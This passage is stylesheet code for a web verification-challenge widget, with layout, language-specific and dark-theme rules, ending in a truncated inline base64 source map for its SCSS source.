    .size-compact #timeout,
    .size-compact #expired {
      margin-top: 9px;
      margin-left: 11px;
    }
    .size-compact #challenge-error {
      margin: 0 2px;
    }
    
    .cb-lb-t {
      display: flex;
      flex-flow: row-reverse nowrap;
      place-content: center flex-end;
      align-items: center;
      padding-left: 2px;
    }
    
    .rtl .cb-lb-t {
      padding-right: 2px;
      padding-left: 0;
    }
    .rtl #success-icon {
      left: 255px;
      margin-left: 8px;
    }
    .rtl #fail-icon {
      left: 255px;
      margin-left: 8px;
    }
    .rtl #spinner-icon {
      left: 255px;
      margin-left: 8px;
    }
    .rtl #timeout-icon,
    .rtl #expired-icon {
      left: 255px;
      margin-left: 8px;
    }
    .rtl #branding {
      margin: 0 0 0 16px;
      padding-right: 0;
      padding-left: 0;
      width: 90px;
      text-align: center;
    }
    .rtl .size-compact #branding {
      padding-right: 0;
      padding-left: 0;
      text-align: center;
    }
    .rtl .size-compact #terms {
      text-align: center;
    }
    .rtl .size-compact #cf-stage {
      padding-right: 48px;
    }
    .rtl .size-compact #success-icon {
      left: 86px;
    }
    .rtl .size-compact #fail-icon {
      left: 86px;
    }
    .rtl .size-compact #spinner-icon {
      left: 86px;
    }
    .rtl .size-compact #timeout-icon,
    .rtl .size-compact #expired-icon {
      left: 86px;
    }
    .rtl .size-compact #expired,
    .rtl .size-compact #timeout {
      margin-top: 0;
      margin-left: 0;
    }
    .rtl .cb-lb {
      padding-right: 37px;
      padding-left: 0;
      text-align: right;
    }
    .rtl .cb-lb input {
      right: 18px;
    }
    .rtl .cb-lb input:checked ~ .cb-i::after {
      right: 8px;
    }
    .rtl .cb-lb .cb-i {
      right: 18px;
    }
    .rtl .cb-c {
      margin-right: 11px;
      margin-left: 0;
      text-align: right;
    }
    .rtl .cb-container {
      margin-left: 0;
    }
    
    #terms {
      display: flex;
      justify-content: space-evenly;
      line-height: 10px;
      color: #1d1f20;
      font-size: 8px;
      font-style: normal;
    }
    #terms a {
      text-decoration: underline;
      line-height: 10px;
      color: #1d1f20;
      font-size: 8px;
      font-weight: 400;
      font-style: normal;
    }
    #terms a:link, #terms a:visited {
      text-decoration: underline;
      line-height: 10px;
      color: #1d1f20;
      font-size: 8px;
      font-weight: 400;
      font-style: normal;
    }
    #terms a:hover, #terms a:focus, #terms a:active {
      text-decoration: underline;
      color: #166379;
    }
    
    #challenge-error-title {
      position: absolute;
      top: 0;
      margin: 5px 0;
      width: 200px;
      height: 55px;
      color: #de1303;
      font-size: 11px;
    }
    #challenge-error-title a {
      color: #1d1f20;
    }
    #challenge-error-title a:hover, #challenge-error-title a:focus, #challenge-error-title a:active {
      text-decoration: underline;
      color: #166379;
    }
    #challenge-error-title a:link, #challenge-error-title a:visited {
      color: #1d1f20;
    }
    #challenge-error-title .icon-wrapper {
      display: none;
    }
    
    .unspun .circle {
      animation: unspin 0.7s cubic-bezier(0.65, 0, 0.45, 1) forwards;
    }
    
    .circle {
      stroke-width: 3px;
      stroke-linecap: round;
      stroke: #038127;
      stroke-dasharray: 0, 100, 0;
      stroke-dashoffset: 200;
      stroke-miterlimit: 1;
      stroke-linejoin: round;
    }
    
    .main-wrapper {
      border-spacing: 0;
    }
    
    .p1 {
      fill: none;
      stroke: #fff;
    }
    
    .timeout-p1,
    .expired-p1 {
      fill: none;
      stroke: #fff;
    }
    
    .offlabel .circle {
      stroke: #1d1f20;
    }
    .offlabel .success-circle {
      stroke: #1d1f20;
      fill: #1d1f20;
    }
    .offlabel .failure-circle {
      stroke: #1d1f20;
    }
    .offlabel #fail-icon {
      box-shadow: inset 0 0 0 #1d1f20;
      animation: fillfail-offlabel 0.4s ease-in-out 0.4s forwards, scale 0.3s ease-in-out 0.9s both;
    }
    
    .theme-dark.offlabel .circle {
      stroke: #fff;
    }
    .theme-dark.offlabel .success-circle {
      stroke: #fff;
      fill: #fff;
    }
    .theme-dark.offlabel .p1 {
      stroke: #000;
    }
    .theme-dark.offlabel .timeout-p1,
    .theme-dark.offlabel .expired-p1 {
      stroke: #000;
    }
    .theme-dark.offlabel .failure-circle {
      stroke: #fff;
    }
    .theme-dark.offlabel .expired-circle,
    .theme-dark.offlabel .timeout-circle {
      fill: #fff;
      stroke: #fff;
    }
    
    .expired-circle,
    .timeout-circle {
      stroke-width: 3px;
      stroke-linecap: round;
      stroke: #6d6d6d;
      fill: #6d6d6d;
      stroke-linejoin: round;
    }
    
    #expired-icon,
    #timeout-icon {
      display: flex;
      margin-right: 8px;
      box-shadow: inset 0 0 0 #6d6d6d;
      width: 30px;
      height: 30px;
      animation: scale 0.3s ease-in-out 0.9s both;
      stroke-width: 6px;
      stroke: #f8f8f8;
      stroke-miterlimit: 10;
    }
    
    .cb-container {
      display: flex;
      align-items: center;
      margin-left: 11px;
    }
    
    .logo-text {
      fill: #000;
    }
    
    #qr {
      fill: #1d1f20;
    }
    #qr svg {
      width: 40px;
      height: 40px;
    }
    
    body.theme-dark {
      background-color: #222;
      color: #fff;
    }
    
    #fr-helper-link,
    #fr-helper-loop-link {
      display: block;
      color: #1d1f20;
    }
    #fr-helper-link:link, #fr-helper-link:visited,
    #fr-helper-loop-link:link,
    #fr-helper-loop-link:visited {
      display: block;
      color: #1d1f20;
    }
    #fr-helper-link:active, #fr-helper-link:hover, #fr-helper-link:focus,
    #fr-helper-loop-link:active,
    #fr-helper-loop-link:hover,
    #fr-helper-loop-link:focus {
      color: #166379;
    }
    
    #expired-refresh-link,
    #timeout-refresh-link {
      display: block;
      color: #1d1f20;
    }
    #expired-refresh-link:link, #expired-refresh-link:visited,
    #timeout-refresh-link:link,
    #timeout-refresh-link:visited {
      display: block;
      color: #1d1f20;
    }
    #expired-refresh-link:active, #expired-refresh-link:hover, #expired-refresh-link:focus,
    #timeout-refresh-link:active,
    #timeout-refresh-link:hover,
    #timeout-refresh-link:focus {
      color: #166379;
    }
    
    html.rtl {
      direction: rtl;
    }
    
    .lang-es-es .cb-lb-t {
      width: 115px;
    }
    .lang-es-es #failure-msg {
      width: 153px;
    }
    .lang-es-es #fr-helper {
      font-size: 12px;
    }
    .lang-es-es .size-compact .cb-lb-t {
      width: 74px;
    }
    .lang-es-es .size-compact #failure-msg {
      width: 85px;
    }
    
    .lang-da-dk .cb-lb-t {
      width: 100px;
    }
    .lang-da-dk .size-compact .cb-lb-t {
      padding-right: 30px;
      width: 65px;
    }
    
    .lang-de-de #branding,
    .lang-vi-vn #branding,
    .lang-bg-bg #branding,
    .lang-el-gr #branding,
    .lang-sv-se #branding {
      display: flex;
      flex-direction: column;
      margin: 0 16px 0 0;
      padding-top: 5px;
      text-align: right;
    }
    .lang-de-de .size-compact #branding,
    .lang-vi-vn .size-compact #branding,
    .lang-bg-bg .size-compact #branding,
    .lang-el-gr .size-compact #branding,
    .lang-sv-se .size-compact #branding {
      display: flex;
      flex-flow: column nowrap;
      place-content: flex-end flex-start;
      align-items: flex-end;
      margin: 0;
      margin-top: 6px;
      margin-left: 16px;
      text-align: right;
    }
    .lang-de-de .size-compact .cb-lb-t,
    .lang-vi-vn .size-compact .cb-lb-t,
    .lang-bg-bg .size-compact .cb-lb-t,
    .lang-el-gr .size-compact .cb-lb-t,
    .lang-sv-se .size-compact .cb-lb-t {
      font-size: 10px;
    }
    .lang-de-de .size-compact #challenge-overlay,
    .lang-de-de .size-compact #challenge-error-text,
    .lang-vi-vn .size-compact #challenge-overlay,
    .lang-vi-vn .size-compact #challenge-error-text,
    .lang-bg-bg .size-compact #challenge-overlay,
    .lang-bg-bg .size-compact #challenge-error-text,
    .lang-el-gr .size-compact #challenge-overlay,
    .lang-el-gr .size-compact #challenge-error-text,
    .lang-sv-se .size-compact #challenge-overlay,
    .lang-sv-se .size-compact #challenge-error-text {
      line-height: 10px;
      font-size: 9px;
    }
    .lang-de-de #terms,
    .lang-vi-vn #terms,
    .lang-bg-bg #terms,
    .lang-el-gr #terms,
    .lang-sv-se #terms {
      display: flex;
      flex-flow: column nowrap;
      justify-content: flex-end;
      line-height: 10px;
      font-style: normal;
    }
    .lang-de-de #terms .link-spacer,
    .lang-vi-vn #terms .link-spacer,
    .lang-bg-bg #terms .link-spacer,
    .lang-el-gr #terms .link-spacer,
    .lang-sv-se #terms .link-spacer {
      display: none;
    }
    .lang-de-de #challenge-error,
    .lang-vi-vn #challenge-error,
    .lang-bg-bg #challenge-error,
    .lang-el-gr #challenge-error,
    .lang-sv-se #challenge-error {
      margin: 8px 4px;
    }
    
    .lang-ja-jp #branding {
      display: flex;
      flex-direction: column;
      margin: 0 16px 0 0;
      padding-top: 5px;
      text-align: right;
    }
    .lang-ja-jp #terms {
      display: flex;
      flex-flow: column nowrap;
      justify-content: flex-end;
      line-height: 10px;
      font-style: normal;
    }
    .lang-ja-jp #terms .link-spacer {
      display: none;
    }
    .lang-ja-jp .cb-lb-t {
      font-size: 11px;
    }
    .lang-ja-jp .size-compact #challenge-overlay,
    .lang-ja-jp .size-compact #challenge-error-text {
      line-height: 10px;
    }
    
    .lang-ru-ru #branding {
      display: flex;
      flex-direction: column;
      margin: 0 16px 0 0;
      padding-top: 5px;
      text-align: right;
    }
    .lang-ru-ru .size-compact #branding {
      display: flex;
      flex-flow: column nowrap;
      place-content: flex-end flex-start;
      align-items: flex-end;
      margin: 0;
      margin-top: 6px;
      margin-left: 16px;
      text-align: right;
    }
    .lang-ru-ru .size-compact #verifying-text {
      font-size: 10px;
    }
    .lang-ru-ru .size-compact .cb-lb-t {
      margin-left: 6px;
      font-size: 10px;
    }
    .lang-ru-ru .size-compact .cb-lb .cb-i {
      left: 11px;
    }
    .lang-ru-ru .size-compact .cb-lb input {
      left: 11px;
    }
    .lang-ru-ru .size-compact #challenge-overlay,
    .lang-ru-ru .size-compact #challenge-error-text {
      line-height: 10px;
      font-size: 8px;
    }
    .lang-ru-ru #terms {
      display: flex;
      flex-flow: column nowrap;
      justify-content: flex-end;
      line-height: 10px;
      font-style: normal;
    }
    .lang-ru-ru #terms .link-spacer {
      display: none;
    }
    .lang-ru-ru #challenge-error {
      margin: 8px 4px;
    }
    
    .overlay {
      position: absolute;
      top: 5px;
      left: 5px;
      opacity: 0.9;
      z-index: 2147483647;
      border: 1px solid #de1303;
      background-color: white;
      padding: 2px;
      height: auto;
      line-height: 8px;
      color: #de1303;
      font-family: consolas, &quot;Liberation Mono&quot;, courier, monospace;
      font-size: 8px;
    }
    
    .lang-it-it .size-compact #challenge-overlay,
    .lang-it-it .size-compact #challenge-error-text {
      line-height: 10px;
      font-size: 9px;
    }
    
    .lang-id-id .size-compact #challenge-overlay,
    .lang-id-id .size-compact #challenge-error-text {
      line-height: 10px;
    }
    
    @media (prefers-color-scheme: dark) {
      body.theme-auto {
        background-color: #222;
        color: #fff;
      }
      .theme-auto h1 {
        color: #fff;
      }
      .theme-auto #challenge-error-title {
        color: #ffa299;
      }
      .theme-auto #challenge-error-title a {
        color: #bbb;
      }
      .theme-auto #challenge-error-title a:visited, .theme-auto #challenge-error-title a:link {
        color: #bbb;
      }
      .theme-auto #challenge-error-title a:hover, .theme-auto #challenge-error-title a:focus, .theme-auto #challenge-error-title a:active {
        color: #949494;
      }
      .theme-auto #challenge-overlay {
        background-color: #222;
      }
      .theme-auto #challenge-overlay,
      .theme-auto #challenge-error-text {
        color: #ffa299;
      }
      .theme-auto #challenge-overlay a,
      .theme-auto #challenge-error-text a {
        color: #bbb;
      }
      .theme-auto #challenge-overlay a:visited, .theme-auto #challenge-overlay a:link,
      .theme-auto #challenge-error-text a:visited,
      .theme-auto #challenge-error-text a:link {
        color: #bbb;
      }
      .theme-auto #challenge-overlay a:hover, .theme-auto #challenge-overlay a:focus, .theme-auto #challenge-overlay a:active,
      .theme-auto #challenge-error-text a:hover,
      .theme-auto #challenge-error-text a:focus,
      .theme-auto #challenge-error-text a:active {
        color: #949494;
      }
      .theme-auto #terms {
        color: #bbb;
      }
      .theme-auto #terms a {
        color: #bbb;
      }
      .theme-auto #terms a:visited, .theme-auto #terms a:link {
        color: #bbb;
      }
      .theme-auto #terms a:hover, .theme-auto #terms a:focus, .theme-auto #terms a:active {
        color: #949494;
      }
      .theme-auto #temrs a:active {
        color: #949494;
      }
      .theme-auto #content {
        border-color: #666;
        background-color: #222;
      }
      .theme-auto #qr {
        fill: rgb(243, 128, 32);
      }
      .theme-auto .logo-text {
        fill: #fff;
      }
      .theme-auto .cb-lb input:checked ~ .cb-i {
        background-color: #6d6d6d;
      }
      .theme-auto .cb-lb input:checked ~ .cb-i::after {
        border-color: #fbad41;
      }
      .theme-auto .cb-lb input:active ~ .cb-i {
        border: 2px solid #fbad41;
      }
      .theme-auto .cb-lb input:focus ~ .cb-i {
        border: 2px solid #fbad41;
      }
      .theme-auto .cb-lb .cb-i {
        border: 2px solid #dadada;
        background-color: #222;
      }
      .theme-auto #success-icon {
        box-shadow: inset 0 0 0 #0aa937;
      }
      .theme-auto #success-icon .p1 {
        box-shadow: inset 0 0 0 #0aa937;
      }
      .theme-auto .success-circle {
        stroke: #0aa937;
        fill: #0aa937;
      }
      .theme-auto #fr-helper-link,
      .theme-auto #fr-helper-loop-link {
        color: #bbb;
      }
      .theme-auto #fr-helper-link:visited, .theme-auto #fr-helper-link:link,
      .theme-auto #fr-helper-loop-link:visited,
      .theme-auto #fr-helper-loop-link:link {
        color: #bbb;
      }
      .theme-auto #fr-helper-link:hover, .theme-auto #fr-helper-link:focus, .theme-auto #fr-helper-link:active,
      .theme-auto #fr-helper-loop-link:hover,
      .theme-auto #fr-helper-loop-link:focus,
      .theme-auto #fr-helper-loop-link:active {
        color: #949494;
      }
      .theme-auto #expired-refresh-link,
      .theme-auto #timeout-refresh-link {
        color: #bbb;
      }
      .theme-auto #expired-refresh-link:visited, .theme-auto #expired-refresh-link:link,
      .theme-auto #timeout-refresh-link:visited,
      .theme-auto #timeout-refresh-link:link {
        color: #bbb;
      }
      .theme-auto #expired-refresh-link:hover, .theme-auto #expired-refresh-link:focus, .theme-auto #expired-refresh-link:active,
      .theme-auto #timeout-refresh-link:hover,
      .theme-auto #timeout-refresh-link:focus,
      .theme-auto #timeout-refresh-link:active {
        color: #949494;
      }
      .theme-auto .overlay {
        border-color: #ffa299;
        color: #ffa299;
      }
    }
    /*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VSb290IjoiL2Nmc2V0dXBfYnVpbGQvc3JjL29yY2hlc3RyYXRvci90dXJuc3RpbGUvdGVtcGxhdGVzIiwic291cmNlcyI6WyJ0dXJuc3RpbGUuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUF5QkE7RUFDSTtJQUNJOzs7QUFJUjtFQUNJO0lBQ0k7OztBQUlSO0VBQ0k7SUFFSTs7RUFHSjtJQUNJOzs7QUFJUjtFQUNJO0lBQ0k7OztBQUlSO0VBQ0k7SUFDSTs7O0FBSVI7RUFDSTtJQUNJOzs7QUFJUjtFQUNJO0lBQ0k7OztBQUlSO0VBQ0k7SUFDSTs7RUFHSjtJQUNJOzs7QUFJUjtFQUNJO0lBQ0k7SUFDQTtJQUNBOztFQUdKO0lBQ0k7OztBQUlSO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7O0FBR0o7RUFDSTtFQUNBLGtCQTlGaUI7RUErRmpCO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQSxPQTlHTTtFQStHTixhQXhHaUI7RUF5R2pCO0VBQ0E7RUFDQTtFQUNBOzs7QUFHSjtFQUNJO0VBQ0E7RUFDQTtFQUNBLE9BMUhNO0VBMkhOO0VBQ0E7OztBQUdKO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7OztBQUdKO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQSxrQkFoSWlCO0VBaUlqQjtFQUNBOzs7QUFHSjtFQUNJOzs7QUFHSjtFQUNJO0VBQ0E7RUFDQTtFQUNBOzs7QUFHSjtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7OztBQUdKO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0EsV0FDSTtFQUVKO0VBQ0E7RUFDQTs7O0FBR0o7RUFDSTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7OztBQUlSO0VBQ0k7RUFDQTtFQUNBO0VBQ0EsUUExTGM7RUEyTGQsTUEzTGM7OztBQStMZDtFQUNJOztBQUVBO0VBQ0k7O0FBSVI7RUFDSSxRQXpNVTtFQTBNVixNQTFNVTs7QUE2TWQ7RUFDSSxrQkFsTmE7O0FBcU5qQjtBQUFBO0VBRUksT0FqT0U7O0FBbU9GO0FBQUE7RUFDSSxPQWpPRjs7QUFtT0U7QUFBQTtBQUFBO0VBRUksT0FyT047O0FBd09FO0FBQUE7QUFBQTtBQUFBO0VBR0ksT0ExT047O0FBZ1BGO0VBQ0k7RUFDQSxrQkE1T1M7O0FBbVBEO0VBQ0k7O0FBT0o7RUFDSSxrQkExUEg7O0FBNFBHO0VBQ0ksY0E1UFQ7O0FBcVFYO0VBQ0k7RUFDQSxXQUNJOztBQUtaO0VBQ0ksT0F6UkU7O0FBNFJOO0VBQ0ksT0EvUkU7O0FBaVNGO0VBQ0ksT0EvUkY7O0FBaVNFO0VBRUksT0FuU047O0FBc1NFO0VBR0ksT0F4U047O0FBNlNOO0VBQ0ksT0EvU0U7O0FBaVRGO0VBQ0ksT0FsVEY7O0FBb1RFO0VBRUksT0F0VE47O0FBeVRFO0VBR0ksT0EzVE47O0FBZ1VOO0VBQ0ksY0FsVFM7RUFtVFQsa0JBNVRhOztBQStUakI7RUFDSTs7QUFHSjtFQUNJOztBQUdKO0FBQUE7RUFFSSxPQWhWRTs7QUFrVkY7QUFBQTtBQUFBO0VBRUksT0FwVkY7O0FBdVZGO0FBQUE7QUFBQTtBQUFBO0VBR0ksT0F6VkY7O0FBNlZOO0FBQUE7RUFFSSxPQWhXRTs7QUFrV0Y7QUFBQTtBQUFBO0VBRUksT0FwV0Y7O0FBdVdGO0FBQUE7QUFBQTtBQUFBO0VBR0ksT0F6V0Y7O0FBNldOO0VBQ0ksY0E5VlM7RUErVlQsT0FuWEU7OztBQXVYVjtFQUNJOzs7QUFHSjtFQUNJO0VBQ0E7RUFDQTtFQUNBLGtCQXRYaUI7OztBQXlYckI7QUFBQTtFQUVJO0VBQ0E7RUFDQSxPQXZZTTtFQXdZTjs7QUFFQTtBQUFBO0VBQ0ksT0E1WUU7O0FBOFlGO0FBQUE7QUFBQTtFQUVJLE9BaFpGOztBQW1aRjtBQUFBO0FBQUE7QUFBQTtFQUdJLE9BblpGOzs7QUF3WlY7RUFDSTtFQUNBOzs7QUFHSjtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0EsUUFsWlc7RUFtWlg7RUFDQTs7O0FBR0o7RUFDSTtFQUNBO0VBQ0E7RUFDQTs7O0FBR0o7RUFDSTtFQUNBO0VBQ0E7RUFDQTtFQUNBOzs7QUFHSjtFQUNJO0VBQ0E7O0FBRUE7RUFDSTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUlRO0VBQ0k7O0FBR0o7RUFDSTs7QUFPSjtFQUNJOztBQUdKO0VBQ0k7O0FBT0o7RUFDSTtFQUNBO0VBQ0E7RUFDQSxrQkF4ZEM7O0FBMGREO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFPcEI7RUFDSTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0k7RUFDQTtFQUNBOzs7QUFLWjtFQUNJOztBQUdJO0VBQ0k7O0FBR0o7RUFDSTs7QUFJUjtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBR0o7RUFDSTtFQUNBOztBQUdKO0VBQ0k7O0FBR0o7RUFDSTtFQUNBO0VBQ0E7O0FBR0o7RUFDSTtFQUNBOztBQUdKO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBR0o7RUFDSTs7QUFHSjtFQUNJOztBQUdKO0VBQ0k7RUFDQTs7QUFHSjtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUdKO0VBQ0k7RUFDQTtFQUNBOztBQUdKO0FBQUE7RUFFSTtFQUNBOztBQUdKO0VBQ0k7OztBQUlSO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7O0FBSUE7RUFDSTtFQUNBOztBQUdKO0VBQ0k7RUFDQTs7QUFHSjtFQUNJO0VBQ0E7O0FBR0o7RUFDSTtFQUNBOztBQUdKO0FBQUE7RUFFSTtFQUNBOztBQUdKO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFJQTtFQUNJO0VBQ0E7RUFDQTs7QUFHSjtFQUNJOztBQUdKO0VBQ0k7O0FBR0o7RUFDSTs7QUFHSjtFQUNJOztBQUdKO0VBQ0k7O0FBR0o7QUFBQTtFQUVJOztBQUdKO0FBQUE7RUFFSTtFQUNBOztBQUlSO0VBQ0k7RUFDQTtFQUNBOztBQUVBO0VBQ0k7O0FBS1k7RUFDSTs7QUFPcEI7RUFDSTs7QUFJUjtFQUNJO0VBQ0E7RUFDQTs7QUFHSjtFQUNJOzs7QUFJUjtFQUNJO0VBQ0E7RUFDQTtFQUNBLE9BL3RCTTtFQWd1Qk47RUFDQTs7QUFFQTtFQUNJO0VBQ0E7RUFDQSxPQXR1QkU7RUF1dUJGO0VBQ0E7RUFDQTs7QUFFQTtFQUVJO0VBQ0E7RUFDQSxPQS91QkY7RUFndkJFO0VBQ0E7RUFDQTs7QUFHSjtFQUdJO0VBQ0EsT0F0dkJGOzs7QUEydkJWO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBLE9BbndCTTtFQW93Qk47O0FBRUE7RUFDSSxPQXh3QkU7O0FBMHdCRjtFQUdJO0VBQ0EsT0Ezd0JGOztBQTh3QkY7RUFFSSxPQW54QkY7O0FBdXhCTjtFQUNJOzs7QUFLSjtFQUNJOzs7QUFJUjtFQUNJO0VBQ0E7RUFDQSxRQXB4QmM7RUFxeEJkO0VBQ0E7RUFDQTtFQUNBOzs7QUFHSjtFQUNJOzs7QUFHSjtFQUNJO0VBQ0E7OztBQUdKO0FBQUE7RUFFSTtFQUNBOzs7QUFJQTtFQUNJLFFBN3pCRTs7QUFnMEJOO0VBQ0ksUUFqMEJFO0VBazBCRixNQWwwQkU7O0FBcTBCTjtFQUNJLFFBdDBCRTs7QUF5MEJOO0VBQ0k7RUFDQSxXQUNJOzs7QUFNUjtFQUNJOztBQUdKO0VBQ0k7RUFDQTs7QUFHSjtFQUNJOztBQUdKO0FBQUE7RUFFSTs7QUFHSjtFQUNJOztBQUdKO0FBQUE7RUFFSTtFQUNBOzs7QUFJUjtBQUFBO0VBRUk7RUFDQTtFQUNBLFFBcjJCaUI7RUFzMkJqQixNQXQyQmlCO0VBdTJCakI7OztBQUdKO0FBQUE7RUFFSTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7OztBQUdKO0VBQ0k7RUFDQTtFQUNBOzs7QUFHSjtFQUNJOzs7QUFHSjtFQUNJLE1BaDVCTTs7QUFrNUJOO0VBQ0k7RUFDQTs7O0FBSVI7RUFDSSxrQkE3NEJpQjtFQTg0QmpCLE9BdDVCTTs7O0FBeTVCVjtBQUFBO0VBRUk7RUFDQSxPQWg2Qk07O0FBazZCTjtBQUFBO0FBQUE7RUFFSTtFQUNBLE9BcjZCRTs7QUF3NkJOO0FBQUE7QUFBQTtBQUFBO0VBR0ksT0F4NkJFOzs7QUE0NkJWO0FBQUE7RUFFSTtFQUNBLE9BbDdCTTs7QUFvN0JOO0FBQUE7QUFBQTtFQUVJO0VBQ0EsT0F2N0JFOztBQTA3Qk47QUFBQTtBQUFBO0FBQUE7RUFHSSxPQTE3QkU7OztBQTg3QlY7RUFDSTs7O0FBSUE7RUFDSTs7QUFHSjtFQUNJOztBQUdKO0VBQ0k7O0FBSUE7RUFDSTs7QUFHSjtFQUNJOzs7QUFNUjtFQUNJOztBQUlBO0VBQ0k7RUFDQTs7O0FBVVI7QUFBQTtBQUFBO0FBQUE7QUFBQTtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBSUE7QUFBQTtBQUFBO0FBQUE7QUFBQTtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBR0o7QUFBQTtBQUFBO0FBQUE7QUFBQTtFQUNJOztBQUdKO0FBQUE7QUFBQTtBQUFBO0FBQUE7QUFBQTtBQUFBO0FBQUE7QUFBQTtBQUFBO0VBRUk7RUFDQTs7QUFJUjtBQUFBO0FBQUE7QUFBQTtBQUFBO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtBQUFBO0FBQUE7QUFBQTtBQUFBO0VBQ0k7O0FBSVI7QUFBQTtBQUFBO0FBQUE7QUFBQTtFQUNJOzs7QUFLSjtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBR0o7RUFDSTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0k7O0FBSVI7RUFDSTs7QUFJQTtBQUFBO0VBRUk7OztBQU1SO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFJQTtFQUNJO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBR0o7RUFDSTs7QUFHSjtFQUNJO0VBQ0E7O0FBSUE7RUFDSTs7QUFHSjtFQUNJOztBQUlSO0FBQUE7RUFFSTtFQUNBOztBQUlSO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNJOztBQUlSO0VBQ0k7OztBQUlSO0VBQ0k7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0Esa0JBMW5DaUI7RUEybkNqQjtFQUNBO0VBQ0E7RUFDQSxPQTFvQ007RUEyb0NOLGFBbm9DZTtFQW9vQ2Y7OztBQUtJO0FBQUE7RUFFSTtFQUNBOzs7QUFPSjtBQUFBO0VBRUk7OztBQUtaO0VBQ0k7SUFDSSxrQkF6cENhO0lBMHBDYixPQWxxQ0U7O0VBc3FDRjtJQUNJLE9BdnFDRjs7RUEwcUNGO0lBQ0ksT0E3cUNGOztFQStxQ0U7SUFDSSxPQTdxQ047O0VBK3FDTTtJQUVJLE9BanJDVjs7RUFvckNNO0lBR0ksT0F0ckNWOztFQTJyQ0Y7SUFDSSxrQkF0ckNTOztFQXlyQ2I7QUFBQTtJQUVJLE9BcnNDRjs7RUF1c0NFO0FBQUE7SUFDSSxPQXJzQ047O0VBdXNDTTtBQUFBO0FBQUE7SUFFSSxPQXpzQ1Y7O0VBNHNDTTtBQUFBO0FBQUE7QUFBQTtJQUdJLE9BOXNDVjs7RUFtdENGO0lBQ0ksT0FydENGOztFQXV0Q0U7SUFDSSxPQXh0Q047O0VBMHRDTTtJQUVJLE9BNXRDVjs7RUErdENNO0lBR0ksT0FqdUNWOztFQXd1Q007SUFDSSxPQXp1Q1Y7O0VBOHVDRjtJQUNJLGNBaHVDSztJQWl1Q0wsa0JBMXVDUzs7RUE2dUNiO0lBQ0k7O0VBR0o7SUFDSTs7RUFPWTtJQUNJLGtCQXh2Q1A7O0VBMHZDTztJQUNJLGNBMXZDYjs7RUFrd0NLO0lBQ0k7O0VBT0o7SUFDSTs7RUFNaEI7SUFDSTtJQUNBLGtCQXR4Q0s7O0VBMHhDYjtJQUNJOztFQUVBO0lBQ0k7O0VBSVI7SUFDSSxRQS94Q007SUFneUNOLE1BaHlDTTs7RUFteUNWO0FBQUE7SUFFSSxPQWh6Q0Y7O0VBa3pDRTtBQUFBO0FBQUE7SUFFSSxPQXB6Q047O0VBdXpDRTtBQUFBO0FBQUE7QUFBQTtJQUdJLE9BenpDTjs7RUE2ekNGO0FBQUE7SUFFSSxPQWgwQ0Y7O0VBazBDRTtBQUFBO0FBQUE7SUFFSSxPQXAwQ047O0VBdTBDRTtBQUFBO0FBQUE7QUFBQTtJQUdJLE9BejBDTjs7RUE2MENGO0lBQ0ksY0E5ekNLO0lBK3pDTCxPQW4xQ0YiLCJzb3VyY2VzQ29udGVudCI6WyIkY29sb3ItMTogIzFkMWYyMDtcbiRjb2xvci0yOiAjZGUxMzAzO1xuJGNvbG9yLTM6ICNmZmEyOTk7XG4kY29sb3ItNDogIzE2NjM3OTtcbiRjb2xvci01OiAjZmZmO1xuJGNvbG9yLTY6ICNiYmI7XG4kY29sb3ItNzogIzk0OTQ5NDtcbiRmb250LWZhbWlseS1ub3JtYWw6IC1hcHBsZS1zeXN0ZW0sIHN5c3RlbS11aSwgYmxpbmttYWNzeXN0ZW1mb250LCAnU2Vnb2UgVUknLCByb2JvdG8sIG94eWdlbiwgdWJ1bnR1LCAnSGVsdmV0aWNhIE5ldWUnLFxuICAgIGFyaWFsLCBzYW5zLXNlcmlmO1xuJGZvbnQtZmFtaWx5LW1vbm86IGNvbnNvbGFzLCAnTGliZXJhdGlvbiBNb25vJywgY291cmllciwgbW9ub3NwYWNlO1xuJGJhY2tncm91bmQtY29sb3ItMTogI2ZmZjtcbiRiYWNrZ3JvdW5kLWNvbG9yLTI6ICNmYWZhZmE7XG4kYmFja2dyb3VuZC1jb